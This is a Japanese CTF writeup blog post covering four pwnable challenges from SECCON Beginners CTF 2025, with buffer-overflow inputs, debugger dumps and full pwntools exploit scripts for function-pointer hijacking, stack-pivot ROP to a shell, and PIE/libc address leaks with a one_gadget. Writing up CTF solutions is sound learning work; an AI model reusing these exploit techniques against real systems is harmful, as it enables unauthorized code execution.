+++
date = 2025-07-29
title = "SECCON Beginners CTF 2025 writeup"
[taxonomies]
tags = ["CTF"]
+++

## これは何
SECCON Beginners CTF 2025 writeupです。私が参加していた`touseki`は21位で、私はpwnableを担当していました。私が回答した問題はpwnableのうち3問ですが、`pivot4b++`も載せておきます。`TimeOfControl`というかヒープとカーネル問は今後の課題です。  

## pet_name
`pet_name`に対する`scanf()`が脆弱だったらしく、32バイトより多い入力でBOF。  
この変数の後ろにファイルパスの変数があるので、そこを`/home/pwn/flag.txt`にするとフラグが見えた。  
```c
char pet_name[32];
scanf("%s", pet_name);
```
つまり  
`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/home/pwn/flag.txt`  
を入力として与えれば良い。フラグは忘れた。  

## pet_sound
`main.c, chall`しか渡されないが、ヒープ臭くて嫌。  
`Pet`構造体には関数ポインタの定義があり、`speak_sound()`という関数が本来は設定される。しかし、`speak_flag()`という関数が存在しており、これに書き換えるのだと思われる。  
また、`Pet`構造体には`char sound[32]`というメンバがあるが、`read(9, pet_A->sound, 0x32)`という自明なBOFが存在する。  

プログラムを実行すると、`pet_A->sound`への入力を促されるが、この入力こそ`read(0, pet_A->sound,, 0x32);`になっており、`0x32 -> 50`である。  
`pet_A->sound`から`pet_B->speak`のオフセットは`5*8 = 40bytes`あり、そこから+8bytesで上書き可能。  
```
--- Pet Hijacking ---
Your mission: Make Pet speak the secret FLAG!

[hint] The secret action 'speak_flag' is at: 0x64aed3852492
[*] Pet A is allocated at: 0x64af0487f2a0
[*] Pet B is allocated at: 0x64af0487f2d0

[Initial Heap State]

--- Heap Layout Visualization ---
0x000064af0487f2a0: 0x000064aed38525d2 <-- pet_A->speak
0x000064af0487f2a8: 0x00002e2e2e6e6177 <-- pet_A->sound
0x000064af0487f2b0: 0x0000000000000000
0x000064af0487f2b8: 0x0000000000000000
0x000064af0487f2c0: 0x0000000000000000
0x000064af0487f2c8: 0x0000000000000031
0x000064af0487f2d0: 0x000064aed38525d2 <-- pet_B->speak (TARGET!)
0x000064af0487f2d8: 0x00002e2e2e6e6177 <-- pet_B->sound
0x000064af0487f2e0: 0x0000000000000000
0x000064af0487f2e8: 0x0000000000000000
0x000064af0487f2f0: 0x0000000000000000
0x000064af0487f2f8: 0x0000000000020d11

Input a new cry for Pet A > 
---------------------------------
```

```python
from pwn import *

file = './chall'
elf = context.binary = ELF(file)
p = remote('pet-sound.challenges.beginners.seccon.jp', 9090)

p.recvuntil(b'at: ')
speak_flag = int(p.recvuntil(b'\n'), 16)
print(f'speak_flag: {hex(speak_flag)}')
p.recvuntil(b'A > ')
p.sendline(b'A'*40 + p64(speak_flag))
p.interactive()
```

## pivot4b
ASLRが効いている。PIEとカナリアは効いていない。  
`char message[0x30]`があり、そのアドレスがリークしている。  
また、`message[0x30]`に対して、`read(0, message, sizeof(message) + 0x10);`がある。  
さらには`system`と`pop rdi, ret`もご親切に用意されている。  

`0x42`は私の`B*8`の入力、`0x00007ffff7db86b5`が`main`が使うリターンアドレス。  
`offset = 7*8 = 56bytes`  
`overwrite_retaddr = 56+8 = 64bytes`  
```
0x7fffffffe130: 0x4242424242424242      0x00007ffff7f7850a
0x7fffffffe140: 0x00007fffffffe180      0x00007ffff7e204b1
0x7fffffffe150: 0x0000000000000000      0x00007ffff7fe49a0
0x7fffffffe160: 0x00007fffffffe200      0x00007ffff7db86b5
```

`sizeof(message) + 0x10 = 0x40 = 64bytes`より入力が64bytesまでと分かる。

問題名の通り、stack pivotingが必要で、私は`leave; ret`を2回使った。  
stack pivotingは退避されたrbpに、rspにセットしたい値を書き込むところから考える。  
次に正規のretに引き取らせたいアドレス、今回はもう一度`leave; ret`したいのでこのアドレスを設定する。  
`leave; ret`が実行されると、`mov rsp, rbp`が最初に走るため、`rsp`が先程上書きしておいたsaved-rbpの位置にある値に変わっている。  
このため、`leave; ret`を構成する命令の2つ目である、`pop rbp`が、saved-rbpの位置に書き込んでおいたアドレスから始まる(今回は`message`の先頭から始まる & `message`は攻撃者の入力バッファなので、payloadの先頭でもある)  
```python
from pwn import *

file = './chall'
elf = context.binary = ELF(file)
p = remote('pivot4b.challenges.beginners.seccon.jp', 12300)
#p = process(file)

LEAVE_RET = 0x0000000000401211
POP_RDI_RET = 0x000000000040117a
RET = 0x000000000040101a

p.recvuntil(b'message: ')
message_addr = int(p.recvuntil(b'\n'), 16)
print(f'message address: {hex(message_addr)}')

# 今回は64bytesピッタリなのでパディングが必要なかった
payload = flat(
    0x0,                # leave (pop rbp)     message+0x00-0x07
    POP_RDI_RET,        # ret                 message+0x08-0x0f
    message_addr+0x28,  # pop rdi             message+0x10-0x17
    RET,                # for movaps          message+0x18-0x1f
    elf.plt['system'],  # ret                 message+0x20-0x27
    b'/bin/sh\x00',     # <-rdi               message+0x28-0x2f
    message_addr,       # overwrite saved-rbp message+0x30-0x37
    LEAVE_RET,          # overwrite ret_addr  message+0x38-0x3f
)

p.recvuntil(b'> ')
input('ready: ')
p.sendline(payload)
p.recvline()

p.interactive()
```
フラグ: `ctf4b{7h3_57ack_c4n_b3_wh3r3v3r_y0u_l1k3}`  

## pivot4b++
相変わらず`0x40`までの入力が認められている
```
pwndbg> x/50gx $rsp
0x7fffffffe190: 0x4242424242424242      0x000000000000000a
0x7fffffffe1a0: 0x0000000000000000      0x0000000000000000
0x7fffffffe1b0: 0x0000000000000000      0x00007ffff7ffd000 <- rtld_global
0x7fffffffe1c0: 0x00007fffffffe1d0      0x000055555555522b <- retaddr
0x7fffffffe1d0: 0x00007fffffffe270      0x00007ffff7db86b5
0x7fffffffe1e0: 0x00007ffff7fc6000      0x00007fffffffe2f8
```

```
pwndbg> retaddr
0x7fffffffe1c8 —▸ 0x55555555522b (main+79) ◂— mov eax, 0
0x7fffffffe1d8 —▸ 0x7ffff7db86b5 (__libc_start_call_main+117) ◂— mov edi, eax
0x7fffffffe278 —▸ 0x7ffff7db8769 (__libc_start_main+137) ◂— mov r14, qword ptr [rip + 0x1be820]
0x7fffffffe2d8 —▸ 0x5555555550a5 (_start+37) ◂— hlt 
```

`rtld_global`なる領域がある
```
pwndbg> x/50gx 0x00007ffff7ffd000
0x7ffff7ffd000 <_rtld_global>:    0x00007ffff7ffe310      0x0000000000000004
0x7ffff7ffd010 <_rtld_global+16>: 0x00007ffff7ffe608      0x0000000000000000
0x7ffff7ffd020 <_rtld_global+32>: 0x00007ffff7f81000      0x0000000000000000
0x7ffff7ffd030 <_rtld_global+48>: 0x0000000000000000      0x0000000000000001

pwndbg> x 0x00007ffff7ffe310
0x7ffff7ffe310: 0x0000555555554000 <- binaryの先頭
pwndbg> x 0x00007ffff7f81000
0x7ffff7f81000: 0x00007ffff7d91000 <- libcの先頭
```

というかpivot先が分からない、PIEでASLRが効いているので。

- saved-rbpやretaddrの1バイトのみを書き換える?
	- ASLRが効いているから書き換えたところで、望んだアドレスになる訳ではない
	- 1つの値だけこれをするならまだ総当りできるが、2つも3つもやるならかなり現実的じゃない
- saved-rbpやretaddrの直前まで書き込むと、入力後の`printf`で`message`に連続した文字列として読める
	- 読めた後に操作できるわけではない
	- retaddrは読めるが、そのためにはretaddrを上書きしないことが求められ、結果として制御を移せたりするわけではない。

---

上記までが大会参加中の私の脳内ダンプであり、下記はwriteup参照後のダンプとなる。

---

どうやら、PIEとASLRが有効でも、コード領域の下位1バイト(正確には下位12bit?)のみは固定らしい
つまりリターンアドレスの1バイトのみを上書きして、`vuln`を再実行することができる。同時にリターンアドレスのリークも可能なので、固定の下位1バイト+リークしたリターンアドレスを組み合わせて最終的にバイナリベースを算出できる。


`vuln`の`read`後のスタック
```
0x7fff8f009850: 0x4242424242424242      0x00007df7b828160a
0x7fff8f009860: 0x0000000000000000      0x00007fff8f009890
0x7fff8f009870: 0x00007fff8f0099a8      0x00005bf568fb71dc
0x7fff8f009880: 0x00007fff8f009890      0x00005bf568fb722b
```

1回目の`main`のリターンアドレス
```
   0x00005bf568fb7221 <+69>:    call   0x5bf568fb7050 <alarm@plt>
   0x00005bf568fb7226 <+74>:    call   0x5bf568fb7179 <vuln>
   0x00005bf568fb722b <+79>:    mov    eax,0x0
```
2回目
```
   0x000061d329327221 <+69>:    call   0x61d329327050 <alarm@plt>
   0x000061d329327226 <+74>:    call   0x61d329327179 <vuln>
   0x000061d32932722b <+79>:    mov    eax,0x0
```
3回目
```
   0x000056a6d0bd9221 <+69>:    call   0x56a6d0bd9050 <alarm@plt>
   0x000056a6d0bd9226 <+74>:    call   0x56a6d0bd9179 <vuln>
   0x000056a6d0bd922b <+79>:    mov    eax,0x0
```


そういえばバイナリベースは`0x1000`にアラインされている -> ということは、下位12bitのみはかならず0になる -> 下位12bitより上はページアライン的にランダムだが、下位12bitは000に固定のオフセットを足すのと同じなので、結果として下位12bitは固定になっていると分かった。

つまり、`'A' * 56 + 0x26(call vuln命令の下位1バイト)`を入力として与えれば
- リターンアドレスを上書きして`main`にある`call vuln`を再実行
- かつ、リターンアドレスまでのデータが連続しているので、`printf`で`message`の内容としてリターンアドレスをリーク可能

リークしたリターンアドレスの下位1バイトが掛けている(vulnの1バイトで上書きしている)が、0x2bなのは自明。リークした値を8bit左にシフトして、`0x2b`を足し合わせれば元のリターンアドレスになる。バイナリベースは、`call main`の次の命令がリターンアドレスなので、その相対オフセット`0x122b`を正規のリターンアドレスから引けば求まる。
```python
retaddr = (data << 8) + 0x2b
elf.address = retaddr - 0x122b
```

次に`libc`のベースを見つけたい。バッファの容量は64バイトしかないことに注意
`chall`ではなく、`chall_patched`だと、`vuln`の`ret`直前に、`rdi`が`libc`のシンボルのアドレスを持っていた。
`*RDI  0x7ffdc76ea5e0 —▸ 0x7eabe9262050 (funlockfile) ◂— endbr64 `


vulnのret直前、rdiがlibcのシンボル(funlockfile)というアドレスを持っていた。
これをリターンアドレスを書き換えて、`puts`直前に飛ばせば、アドレスがリークするかもしれない。
通常の`chall`だとこのような挙動にならず、`chall_patched`のみ確認できた。おそらく`libc`のバージョンに依存しているのだと思われる。

ともかく、次の`vuln`の実行では`'A'*56 + p64(elf.sym['vuln']+18)`を送信して、`ret`直後に残っている`rdi`を利用し、`vuln+18`こと`puts`の呼び出しに飛ばせる。
こうすると、`funlockfile`のアドレスがリークしたため、相対アドレスを引けば`libc`ベースが求まる。

問題は、この次が再実行されないこと。
退避されたrbpをどうにかして適当な値にしないと行けないらしいが意味がわらない
`elf.base + 0x5000 - 0x10`というアドレスにするらしい。
場所的にはread/writeな箇所のように見えるが、おそらくここはコード領域っぽくない。
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File 
    0x604879d4d000     0x604879d4e000 r--p     1000      0 chall_patched
    0x604879d4e000     0x604879d4f000 r-xp     1000   1000 chall_patched
    0x604879d4f000     0x604879d50000 r--p     1000   2000 chall_patched
    0x604879d50000     0x604879d51000 r--p     1000   2000 chall_patched
    0x604879d51000     0x604879d54000 rw-p     3000   3000 chall_patched
    0x726a26800000     0x726a26828000 r--p    28000      0 libc.so.6
```
結局、バイナリのベース+`0x5000`に設定してみたら再度`vuln`+18から実行されて、もう一度入力を求められた。

最後に`one_gadget`する
```
0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```
とりあえず、`rbp`が指す先が`writable`なら良さそうなので、バイナリベース+`0x6000`にでも設定しておく。
リターンアドレスは`libc.address + 0xebd3f`に上書きすれば良い。

なぜかローカルでは動くが、コンテナでは動かなかった。
ここで、twitterでRW領域が`pwninit`でパッチされたものと異なっておりハマっている人を発見。
私の問題もそんな所だろうと考えて、2回目のペイロードの送信時の`saved-rbp`を上書きする値を`bss+0x100`に設定し、3回目の`one_gadget`のための`saved-rbp`を`bss+0x200`に設定しておくとうまく行った。

```python
from pwn import *
file = './chall_patched'
libc_file = './libc.so.6'
elf = context.binary = ELF(file)
libc = ELF(libc_file)
#p = process(file)
p = remote('localhost', '12300')

# calculate binary base
p.sendafter(b'> ', b'A'*56 + b'\x26')
p.recvuntil(b'\x26')
data = p.recvuntil(b'\n').strip()
data = int.from_bytes(data, byteorder='little')
retaddr = (data << 8) + 0x2b
elf.address = retaddr - 0x122b


# second vuln, calculate libc base
payload = b'A'*48 + p64(elf.bss()+0x100) + p64(elf.sym['vuln'] + 18)
p.sendafter(b'> ', payload)
p.recvuntil(b'\n')
funlockfile_leak = int.from_bytes(p.recv(6), byteorder='little')
libc.address = funlockfile_leak - libc.sym['funlockfile']
print(f'libc base: {hex(libc.address)}')
print(f'leak : {hex(funlockfile_leak)}')


# third vuln, begin fron vuln+18
# overwrite saved-rbp for one_gadget, then jump to the address of one_gadget
payload = b'A'*48 + p64(elf.bss()+0x200) + p64(libc.address + 0xebd3f)
p.sendafter(b'> ', payload)
p.interactive()
```

## 最後に
正直`pivot4b++`がなぜこのコードで解けるのかを詳細に理解していない。  
去年のSECCON Beginnersのwriteupを見返してみたが、去年よりは成長していると実感した。  
去年はROPとか一ミリも分からなかったし、pwntoolsとかも使っていなかった。  
今年の目標はStack-basedなexploitの強化と、Heap-basedなexploitの学習を目指したい。  
